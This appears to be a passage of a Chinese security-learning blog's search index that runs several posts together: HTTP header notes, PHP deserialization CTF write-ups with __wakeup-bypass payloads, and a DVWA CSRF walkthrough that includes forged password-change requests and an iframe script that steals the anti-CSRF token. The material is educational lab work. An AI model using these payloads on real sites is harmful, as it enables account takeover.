网站备份文件泄露该漏洞的成因主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。常见后缀：.rar .zip .7z .tar.gz .bak .swp .txt .sql参考：WEB安全-常见源码泄露 assert引起的代码注射","categories":[],"tags":[]},{"title":"httpx","slug":"http","date":"2020-02-08T08:42:41.000Z","updated":"2020-02-08T08:43:14.121Z","comments":true,"path":"2020/02/08/http/","link":"","permalink":"http://yoursite.com/2020/02/08/http/","excerpt":"http请求","text":"http请求 结构http报文由三部分组成：请求行、请求头、请求体其中，1、2、3组成请求行、4是请求头、5是请求体。 请求行请求方法：请求url：可在它后面加参数进行git方式的参数提交。 请求头包含若干属性，服务端由此获得客户端的信息。 常用的HTTP请求头 协议头 说明 示例 状态 Accept 可接受的响应内容类型（Content-Types）。 Accept: text/plain 固定 Accept-Charset 可接受的字符集 Accept-Charset: utf-8 固定 Accept-Encoding 可接受的响应内容的编码方式。 Accept-Encoding: gzip, deflate 固定 Accept-Language 可接受的响应内容语言列表。 Accept-Language: en-US 固定 Accept-Datetime 可接受的按照时间来表示的响应内容版本 Accept-Datetime: Sat, 26 Dec 2015 17:30:00 GMT 临时 Authorization 用于表示HTTP协议中需要认证资源的认证信息 Authorization: Basic OSdjJGRpbjpvcGVuIANlc2SdDE== 固定 Cache-Control 用来指定当前的请求/回复中的，是否使用缓存机制。 Cache-Control: no-cache 固定 Connection 客户端（浏览器）想要优先使用的连接类型 Connection: keep-alive Connection: Upgrade 固定 Cookie 由之前服务器通过Set-Cookie（见下文）设置的一个HTTP协议Cookie Cookie: $Version=1; Skin=new; 固定：标准 Content-Length 以8进制表示的请求体的长度 Content-Length: 348 固定 Content-MD5 请求体的内容的二进制 MD5 散列值（数字签名），以 Base64 编码的结果 Content-MD5: oD8dH2sgSW50ZWdyaIEd9D== 废弃 Content-Type 请求体的MIME类型 （用于POST和PUT请求中） Content-Type: application/x-www-form-urlencoded 固定 Date 发送该消息的日期和时间（以RFC 7231中定义的\"HTTP日期\"格式来发送） Date: Dec, 26 Dec 2015 17:30:00 GMT 固定 Expect 表示客户端要求服务器做出特定的行为 Expect: 100-continue 固定 From 发起此请求的用户的邮件地址 From: user@itbilu.com 固定 Host 表示服务器的域名以及服务器所监听的端口号。如果所请求的端口是对应的服务的标准端口（80），则端口号可以省略。 Host: www.itbilu.com:80 Host: www.itbilu.com 固定 If-Match 仅当客户端提供的实体与服务器上对应的实体相匹配时，才进行对应的操作。主要用于像 PUT 这样的方法中，仅当从用户上次更新某个资源后，该资源未被修改的情况下，才更新该资源。 If-Match: \"9jd00cdj34pss9ejqiw39d82f20d0ikd\" 固定 If-Modified-Since 允许在对应的资源未被修改的情况下返回304未修改 If-Modified-Since: Dec, 26 Dec 2015 17:30:00 GMT 固定 If-None-Match 允许在对应的内容未被修改的情况下返回304未修改（ 304 Not Modified ），参考 超文本传输协议 的实体标记 If-None-Match: \"9jd00cdj34pss9ejqiw39d82f20d0ikd\" 固定 If-Range 如果该实体未被修改过，则向返回所缺少的那一个或多个部分。否则，返回整个新的实体 If-Range: \"9jd00cdj34pss9ejqiw39d82f20d0ikd\" 固定 If-Unmodified-Since 仅当该实体自某个特定时间以来未被修改的情况下，才发送回应。 If-Unmodified-Since: Dec, 26 Dec 2015 17:30:00 GMT 固定 Max-Forwards 限制该消息可被代理及网关转发的次数。 Max-Forwards: 10 固定 Origin 发起一个针对跨域资源共享的请求（该请求要求服务器在响应中加入一个Access-Control-Allow-Origin的消息头，表示访问控制所允许的来源）。 Origin: http://www.itbilu.com 固定: 标准 Pragma 与具体的实现相关，这些字段可能在请求/回应链中的任何时候产生。 Pragma: no-cache 固定 Proxy-Authorization 用于向代理进行认证的认证信息。 Proxy-Authorization: Basic IOoDZRgDOi0vcGVuIHNlNidJi2== 固定 Range 表示请求某个实体的一部分，字节偏移以0开始。 Range: bytes=500-999 固定 Referer 表示浏览器所访问的前一个页面，可以认为是之前访问页面的链接将浏览器带到了当前页面。Referer其实是Referrer这个单词，但RFC制作标准时给拼错了，后来也就将错就错使用Referer了。 Referer: http://itbilu.com/nodejs 固定 TE 浏览器预期接受的传输时的编码方式：可使用回应协议头Transfer-Encoding中的值（还可以使用\"trailers\"表示数据传输时的分块方式）用来表示浏览器希望在最后一个大小为0的块之后还接收到一些额外的字段。 TE: trailers,deflate 固定 User-Agent 浏览器的身份标识字符串 User-Agent: Mozilla/…… 固定 Upgrade 要求服务器升级到一个高版本协议。 Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11 固定 Via 告诉服务器，这个请求是由哪些代理发出的。 Via: 1.0 fred, 1.1 itbilu.com.com (Apache/1.1) 固定 Warning 一个一般性的警告，表示在实体内容体中可能存在错误。 Warning: 199 Miscellaneous warning 固定 hgame接头霸王一开始的页面的是有一句话You need to come from https://vidar.club/. 那么应该是http header。然后就没做出来，当时也用了If-Modified-Since，但没有响应，这种情况遇到过几回，如果把属性的顺序换一下就有可能解决，而且响应后再把顺序换回来也可以响应了，不知道为什么，难道是玄学。If-Modified-Since：标准的HTTP请求头标签，在发送HTTP请求时，把浏览器端缓存页面的最后修改时间一起发到服务器去，服务器会把这个时间与服务器上实际文件的最后修改时间进行比较。如果时间一致，那么返回HTTP状态码304（不返回文件内容），客户端接到之后，就直接把本地缓存文件显示到浏览器中。如果时间不一致，就返回HTTP状态码200和新的文件内容，客户端接到之后，会丢弃旧文件，把新文件缓存起来，并显示到浏览器中。 请求体传输post请求的参数，需要注意的是请求体和请求头之间要空行。 http响应结构 响应状态码http响应报文独有的，它直接向客户端将显示了http请求的处理结果。如：200 ok 、404 notfound等HTTP 响应代码 常用的http响应头 响应头 说明 示例 状态 Access-Control-Allow-Origin 指定哪些网站可以跨域源资源共享 Access-Control-Allow-Origin: * 临时 Accept-Patch 指定服务器所支持的文档补丁格式 Accept-Patch: text/example;charset=utf-8 固定 Accept-Ranges 服务器所支持的内容范围 Accept-Ranges: bytes 固定 Age 响应对象在代理缓存中存在的时间，以秒为单位 Age: 12 固定 Allow 对于特定资源的有效动作; Allow: GET, HEAD 固定 Cache-Control 通知从服务器到客户端内的所有缓存机制，表示它们是否可以缓存这个对象及缓存有效时间。其单位为秒 Cache-Control: max-age=3600 固定 Connection 针对该连接所预期的选项 Connection: close 固定 Content-Disposition 对已知MIME类型资源的描述，浏览器可以根据这个响应头决定是对返回资源的动作，如：将其下载或是打开。 Content-Disposition: attachment; filename=\"fname.ext\" 固定 Content-Encoding 响应资源所使用的编码类型。 Content-Encoding: gzip 固定 Content-Language 响就内容所使用的语言 Content-Language: zh-cn 固定 Content-Length 响应消息体的长度，用8进制字节表示 Content-Length: 348 固定 Content-Location 所返回的数据的一个候选位置 Content-Location: /index.htm 固定 Content-MD5 响应内容的二进制 MD5 散列值，以 Base64 方式编码 Content-MD5: IDK0iSsgSW50ZWd0DiJUi== 已淘汰 Content-Range 如果是响应部分消息，表示属于完整消息的哪个部分 Content-Range: bytes 21010-47021/47022 固定 Content-Type 当前内容的MIME类型 Content-Type: text/html; charset=utf-8 固定 Date 此条消息被发送时的日期和时间(以RFC 7231中定义的\"HTTP日期\"格式来表示) Date: Tue, 15 Nov 1994 08:12:31 GMT 固定 ETag 对于某个资源的某个特定版本的一个标识符，通常是一个 消息散列 ETag: \"737060cd8c284d8af7ad3082f209582d\" 固定 Expires 指定一个日期/时间，超过该时间则认为此回应已经过期 Expires: Thu, 01 Dec 1994 16:00:00 GMT 固定: 标准 Last-Modified 所请求的对象的最后修改日期(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示) Last-Modified: Dec, 26 Dec 2015 17:30:00 GMT 固定 Link 用来表示与另一个资源之间的类型关系，此类型关系是在RFC 5988中定义 Link: ; rel=\"alternate\" 固定 Location 用于在进行重定向，或在创建了某个新资源时使用。 Location: http://www.itbilu.com/nodejs 固定 P3P P3P策略相关设置 P3P: CP=\"This is not a P3P policy! 固定 Pragma 与具体的实现相关，这些响应头可能在请求/回应链中的不同时候产生不同的效果 Pragma: no-cache 固定 Proxy-Authenticate 要求在访问代理时提供身份认证信息。 Proxy-Authenticate: Basic 固定 Public-Key-Pins 用于防止中间攻击，声明网站认证中传输层安全协议的证书散列值 Public-Key-Pins: max-age=2592000; pin-sha256=\"……\"; 固定 Refresh 用于重定向，或者当一个新的资源被创建时。默认会在5秒后刷新重定向。 Refresh: 5; url=http://itbilu.com Retry-After 如果某个实体临时不可用，那么此协议头用于告知客户端稍后重试。其值可以是一个特定的时间段(以秒为单位)或一个超文本传输协议日期。 示例1:Retry-After: 120 示例2: Retry-After: Dec, 26 Dec 2015 17:30:00 GMT 固定 Server 服务器的名称 Server: nginx/1.6.3 固定 Set-Cookie 设置HTTP cookie Set-Cookie: UserID=itbilu; Max-Age=3600; Version=1 固定: 标准 Status 通用网关接口的响应头字段，用来说明当前HTTP连接的响应状态。 Status: 200 OK Trailer Trailer用户说明传输中分块编码的编码信息 Trailer: Max-Forwards 固定 Transfer-Encoding 用表示实体传输给用户的编码形式。包括：chunked、compress、 deflate、gzip、identity。 Transfer-Encoding: chunked 固定 Upgrade 要求客户端升级到另一个高版本协议。 Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11 固定 Vary 告知下游的代理服务器，应当如何对以后的请求协议头进行匹配，以决定是否可使用已缓存的响应内容而不是重新从原服务器请求新的内容。 Vary: * 固定 Via 告知代理服务器的客户端，当前响应是通过什么途径发送的。 Via: 1.0 fred, 1.1 itbilu.com (nginx/1.6.3) 固定 Warning 一般性警告，告知在实体内容体中可能存在错误。 Warning: 199 Miscellaneous warning 固定 WWW-Authenticate 表示在请求获取这个实体时应当使用的认证模式。 WWW-Authenticate: Basic 固定 参考：HTTP的请求头标签 If-Modified-SinceHTTP消息头（HTTP headers）－常用的HTTP请求头与响应头HTTP 响应代码","categories":[],"tags":[]},{"title":"notes on php serialize","slug":"notes on php serialize","date":"2020-02-06T05:21:32.000Z","updated":"2020-03-23T12:33:15.515Z","comments":true,"path":"2020/02/06/notes on php serialize/","link":"","permalink":"http://yoursite.com/2020/02/06/notes on php serialize/","excerpt":"php 类、对象、序列化、反序列化","text":"php 类、对象、序列化、反序列化 函数serialize()unserialize() 是什么php序列化：把一个对象转换成可以传输的字符串。方便每次使用的时候放出来。php反序列化：把那个字符串变回来。 序列化字符串格式eg：O:7:&quot;Student&quot;:1:{s:5:&quot;score&quot;;s:5:&quot;10000&quot;;}这里的”O”(大写)代表存储的是对象（object）,假如给serialize()传入的是一个数组，那它会变成字母a。7表示对象的名称有7个字符。”Student”表示对象的名称。1表示有一个值。{s:5:”score”;s:5:”10000”;}中，s表示字符串，5表示该字符串的长度，”score”为字符串的名称。 魔术方法__construct()：当对象创建(new)时会自动调用。__destruct()：（析构函数）：当对象被销毁时会自动调用。__wakeup() ：unserialize()时会自动调用。 123456789101112131415161718192021222324252627282930313233&lt;?php /** * */ class demo &#123; public $data; function __construct() &#123; echo (&quot;construcrt worked.&quot;); echo (&quot;&lt;br&gt;&quot;); &#125; function __destruct() &#123; echo (&quot;destruct worked.&quot;); echo (&quot;&lt;br&gt;&quot;); &#125; function __wakeup() &#123; echo (&quot;wakeup worked.&quot;); echo (&quot;&lt;br&gt;&quot;); &#125; &#125; new demo();?&gt;/* construcrt worked. destruct worked.*/ 绕过__wakeup() （unserialize()时会自动调用。）wakeup经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。绕过：当反序列化中表示object的个数的数字大于原有数量时就不会执行wakeup()函数。 demo12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); //解决php5中文乱码 class demo &#123; public $data; function __construct($data) &#123; $this-&gt;data = $data; echo &quot;construct worked.&lt;br&gt;&quot;; &#125; function __wakeup() &#123; echo (&quot;wakeup worked.&quot;); echo (&quot;&lt;br&gt;&quot;); &#125; function __destruct() &#123; echo (&quot;destruct worked.&quot;); &#125; &#125; $s_demo=serialize(new demo(&quot;123&quot;)); echo (&quot;序列化后：&quot;); print_r($s_demo); echo (&quot;&lt;br&gt;&quot;); var_dump(unserialize($s_demo)); echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; $changeS_demo =&apos;O:4:&quot;demo&quot;:2:&#123;s:4:&quot;data&quot;;s:3:&quot;123&quot;;&#125;&apos;; echo (&quot;改变object数后：&quot;.$changeS_demo.&quot;&lt;br&gt;&quot;); unserialize($changeS_demo); ?&gt; 适用版本php.5.2 \\5.3 \\5.5 \\5.6\\7.0 一些运行结果php 5.2.17php 5.4.45 php 7.3.4 xctf unserialize 3题目： 123456class xctf&#123;public $flag = &apos;111&apos;;public function __wakeup()&#123;exit(&apos;bad requests&apos;);&#125;?code= 实例化类并序列化。 1234567891011121314151617&lt;?php/** * */class xctf &#123; public $flag = &apos;111&apos;; public function __wakeup()&#123; exit(&apos;bad requests&apos;);&#125;&#125;$code1 = new xctf();print_r(serialize($code1));?&gt;//O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125; 修改object数，上传。?code=O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}显示的应该只是部分代码，下面这道题比较详细 创建对象执行__construct2019 Geek 1234567891011121314151617&lt;br&gt;&lt;!--class Student&#123; public $score = 0; public function __destruct() &#123; echo &quot;__destruct working&quot;; if($this-&gt;score==10000) &#123; $flag = &quot;******************&quot;; echo $flag; &#125; &#125;&#125;$exp = $_GET[&apos;exp&apos;];echo &quot;&lt;br&gt;&quot;;unserialize($exp);?&gt; 只要执行了destruct就可。直接写出序列化字符串：O:7:&quot;Student&quot;:1:{s:5:&quot;score&quot;;s:5:&quot;10000&quot;;} 序列化结果数字替换方法之前都是直接复制序列化结果然后改数字就完事，这里遇到需要把修改后的字符串再base64加密，结果发现手动复制后的结果不对。 123456789101112131415161718192021222324252627282930313233&lt;?phpheader(&quot;Content-Type: text/html;charset=utf-8&quot;);class Demo &#123; private $file = &apos;index.php&apos;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &apos;index.php&apos;) &#123; //the secret is in the fl4g.php $this-&gt;file = &apos;index.php&apos;; &#125; &#125; &#125;$a=new Demo(&apos;fl4g.php&apos;);$str_a=(serialize($a));//$str_a=&quot;O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;&quot;$str_a=preg_replace(&apos;&#123;4&#125;&apos;,&apos;+4&apos;,$str_a,1);//把“4” 换成“+4”且不把后面fl4g的4换掉。$str_a=preg_replace(&apos;&#123;1&#125;&apos;,&apos;2&apos;,$str_a);echo(&quot;需要使结果变成这样再编码：&quot;);print $str_a;echo (&quot;&lt;br&gt;&quot;);$str_a=base64_encode($str_a);echo (&apos;序列化后base64编码得到：&apos;.$str_a.&quot;（正确）&quot;);echo (&quot;&lt;br&gt;&quot;);print_r(&quot;手动复制序列化结果再base64编码得到：&quot;.base64_encode(&apos;O:+4:&quot;Demo&quot;:2:&#123;s:20:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;&apos;).&quot;（错误）&quot;);echo (&quot;&lt;br&gt;&quot;);print_r(&quot;手动复制序列化结果并在Demofile加“·”即“Demo·file”再base64编码得到：&quot;.base64_encode(&apos;O:+4:&quot;Demo&quot;:2:&#123;s:20:&quot;Demo·file&quot;;s:8:&quot;fl4g.php&quot;;&#125;&apos;).&quot;（正确）&quot;);?&gt; 反序列化后直接用replace来替换相关参数后的编码结果和手动复制（直接写）的编码结果不一样。看到wp说原因是file变量为私有变量，所以序列化之后的字符串开头结尾各有一个空白字符（即%00），字符串长度也比实际长度大2，如果将序列化结果复制到在线的base64网站进行编码可能就会丢掉空白字符，所以这里直接在php代码里进行编码。类似的还有protected类型的变量，序列化之后字符串首部会加上%00*%00。遇到类似的问题还是用脚本来生成比较稳昂。参考：关于unserialize绕过__wakeupPHP 魔术方法 __sleep __wakeup(四)","categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://yoursite.com/tags/php/"}]},{"title":"DVWA--CSRF","slug":"DVWA-CSRF","date":"2020-01-05T02:23:16.000Z","updated":"2020-01-12T03:30:22.768Z","comments":true,"path":"2020/01/05/DVWA-CSRF/","link":"","permalink":"http://yoursite.com/2020/01/05/DVWA-CSRF/","excerpt":"之前在 bruteforce 、command injection 中impossible安全等级里都有一个anti-CSRF令牌，那么到底什么是CSRF呢，它的原理，怎么防御？","text":"之前在 bruteforce 、command injection 中impossible安全等级里都有一个anti-CSRF令牌，那么到底什么是CSRF呢，它的原理，怎么防御？ CSRF（Cross-site request forgery）中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。 过程： CSRF发生的条件：1.访问了存在CSRF的网站A并留下了cookie；2.在不登出A的情况下访问攻击网站B； 需要注意的是： 如果不设定时间，cookie的生命周期为浏览器的会话时间，关闭浏览器，cookie自动消失，这是会话cookie。但如果设置了过期时间，浏览器会把cookie保存到硬盘中，再次打开浏览器时会依然有效直至超出有效时间。所以关闭浏览器不一定等于结束了会话； 这里的网站B有可能会是一个存在漏洞的被很多人访问、信任的网站。 document.getElementById(elementID)getElementById() 方法可返回对拥有指定 ID 的第一个对象的引用。如果没有指定 ID 的元素返回 null如果存在多个指定 ID 的元素则返回第一个。如果需要查找到那些没有 ID 的元素，你可以考虑通过CSS选择器使用 querySelector()。 easy 1234567891011121314151617181920212223242526272829&lt;?phpif( isset( $_GET[ &apos;Change&apos; ] ) ) &#123; // Get input $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; easy里面没有任何防御措施，通过$_GET变量获取get方式获得的password_new以及password_conf的值。此外从带有 GET 方法的表单发送的信息，对任何人都是可见的（会显示在浏览器的地址栏），并且对发送信息的量也有限制。地址栏可以看到请求的过程从而进行伪造：这里做一个简单的网页（网站B）,非常简单。。只有一张图片，而且还显示不了： 123456789&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;网站B&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;img src=&quot;http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=%B8%FC%B8%C4#&quot;&gt;&lt;/body&gt;&lt;/html&gt; 打开DVWA修改密码页面，此时cookie就保存到了本地，再访问网站B，网站B就向DVWA发送修改密码的请求，由于本地仍有之前保存的cookie，修改密码的页面就会执行请求；重新登陆，发现密码被修改为了123：当然，也可以直接打开一个网页，在地址栏里输入http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=%B8%FC%B8%C4#是一样的。 medium 123456789101112131415161718192021222324252627282930313233343536&lt;?phpif( isset( $_GET[ &apos;Change&apos; ] ) ) &#123; // Checks to see where the request came from if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) &#123; // Get input $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Didn&apos;t come from a trusted source echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; stripos(string,find,start) string 必需。规定要搜索的字符串。 find 必需。规定要查找的字符。 start 可选。规定开始搜索的位置。 返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。注释：字符串位置从 0 开始，不是从 1 开始。PHP版本：5+ $_SERVER[‘HTTP_REFERER’]链接到当前页面的前一页面的 URL 地址HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器是从哪个页面链接过来的必须是类似 点击某个页面的链接地址才能取到这个值页面一 123456789&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;页面一&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;a href=&quot;http://127.0.0.1/test/CSRF-medium.php&quot;&gt;medium&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 页面二 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;上一个页面是：&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php $v_url=$_SERVER[&apos;HTTP_REFERER&apos;]; print_r($v_url);?&gt; 通常下面的一些方式，$_SERVER[‘HTTP_REFERER’] 会无效： 直接输入网址访问该网页。 Javascript 打开的网址。 Javascript 重定向（window.location）网址。 使用 meta refresh 重定向的网址。 使用 PHP header 重定向的网址。 flash 中的链接。 浏览器未加设置或被用户修改。 所以一般来说，只有通过 超链接以及 POST 或 GET 表单访问的页面，$_SERVER[‘HTTP_REFERER’] 才有效。由于 $_SERVER[‘HTTP_REFERER’] 对 POST 表单访问也是有效的，因此在表单数据处理页面一定程度上可以通过校验 $_SERVER[‘HTTP_REFERER’] 来防止表单数据的恶意提交。但该方法并不能保证表单数据的绝对正确，即对表单数据的真实性检测并不能完全依赖于 $_SERVER[‘HTTP_REFERER’] 。 $_SERVER[ ‘SERVER_NAME’ ]显示当前脚本运行所在服务器的主机名 12345678910&lt;?php $v_url=$_SERVER[&apos;HTTP_REFERER&apos;]; $v_name=$_SERVER[ &apos;SERVER_NAME&apos; ]; print_r($v_url); echo (&quot;&lt;br&gt;&quot;); echo (&quot;当前运行脚本所在的服务器的主机名:&quot;); echo (&quot;&lt;br&gt;&quot;); print_r($v_name);?&gt; 计算机名、域名、主机名以http://www.sina.com.cn/为例，http是通信使用的协议，sina.com.cn是域名，www是提供服务的机器的名字（计算机名），计算机名+域名才是主机名，即www.sina.com.cn是主机名。再举个例子，http://blog.sina.com.cn/中，blog是提供博客服务的那台机器的名字，sina.com.cn是域名，blog.sina.com.cn是主机名。 方法这里用了if( stripos( $_SERVER[ &#39;HTTP_REFERER&#39; ] ,$_SERVER[ &#39;SERVER_NAME&#39; ]) !== false ) 来验证通过get传输的数据是否是来统一主机名之下，由于stripos( $_SERVER[ ‘HTTP_REFERER’ ] 在地址栏输入的情况下失效，就不能通过在地址栏上直接改参数来进行修改密码，但通过上述easy中建一个网站的方法依然适用，只要该路径中包含被攻击网站的主机名都可以。 high 1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_GET[ &apos;Change&apos; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 加入了token验证，每次的token都不一样会刷新； 需要借助脚本来获取token：csrf.js: 1234567891011121314151617181920&lt;script type=&quot;text/javascript&quot;&gt; function attack() &#123; document.getElementsByName(&apos;user_token&apos;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&apos;user_token&apos;)[0].value; document.getElementById(&quot;transfer&quot;).submit(); &#125;&lt;/script&gt;&lt;iframe src=&quot;http://127.0.0.1/dvwa-master/vulnerabilities/csrf/&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display: none;&quot;&gt;&lt;/iframe&gt;&lt;body onload=&quot;attack()&quot;&gt; &lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://127.0.0.1/dvwa-master/vulnerabilities/csrf/&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt; &lt;/form&gt;&lt;/body&gt; onload 常用在 中，一旦完全加载所有内容（包括图像、脚本文件、CSS 文件等），就执行一段脚本。 [0] 是下标号，下标号f从 0 开始。可以通过下标号访问节点。 编程接口: 可通过 JavaScript （以及其他编程语言）对 HTML DOM 进行访问。 所有 HTML 元素被定义为对象，而编程接口则是对象方法和对象属性。 方法是您能够执行的动作（比如添加或修改元素）。比如getElementById()就是DOM对象方法。 属性是您能够获取或设置的值（比如节点的名称或内容）。 document关于contentWindow属性的js写法有两：1.第一种是先通过document.getById获取到子页面的iframe标签，然后一点后直接使用contentWindow属性，紧挨着后面跟着的便是子页面中的某个方法； 2.第二种写法是以一种变量赋值的形式来调用contentWindow属性的，将相应的子页面对象赋值到该变量当中，接着也可以使用其中的方法了。 因为dvwa和构造网站在同一域名下就不会因为跨域问题而无法获取目标网站上的token值；打开修改密码页面后再访问csrf.js页面，就可以修改密码。 但是通常情况，两个网站不会处于统一域名下，而现在的浏览器是不允许跨域请求的。跨域名的两者的域名不同，域名B下的所有页面都不允许主动获取域名A下的页面内容，除非域名A下的页面主动发送信息给域名B的页面，所以我们的攻击脚本是不可能取到改密界面中的user_token。由于跨域是不能实现的，所以我们要将攻击代码注入到目标服务器中，才有可能完成攻击。利用XSS漏洞协助获取Anti-CSRF token。 未完待续~参考：Iframes and Cross-Document Communication隐藏域的作用浅谈CSRF攻击方式$_SERVER[‘HTTP_REFERER’]的使用域名、主机名与URL简书-csrfContentWindow属性的用法及作用","categories":[],"tags":[]},{"title":"notes on python","slug":"notes on python","date":"2020-01-04T14:20:52.000Z","updated":"2020-03-23T12:33:04.222Z","comments":true,"path":"2020/01/04/notes on 